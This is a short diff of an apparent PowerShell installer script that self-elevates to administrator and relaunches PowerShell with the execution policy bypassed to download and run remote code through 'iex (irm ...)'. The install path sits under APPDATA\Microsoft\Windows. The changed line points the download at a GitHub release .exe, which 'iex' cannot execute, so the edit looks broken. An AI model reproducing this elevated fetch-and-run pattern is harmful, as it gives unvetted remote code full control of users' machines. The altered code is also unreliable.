@@ -9,7 +9,7 @@ $InstallPath= if($env:CF_PATH) {$env:CF_PATH} else {"$env:APPDATA\Microsoft\Wind
 # ── Само-повышение до администратора ──────────────────────────────────────────
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
     Write-Host "[*] Requesting admin..." -ForegroundColor Yellow
-    $rawUrl = "https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1"
+    $rawUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
     Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$rawUrl')`"" -Verb RunAs
     exit
 }
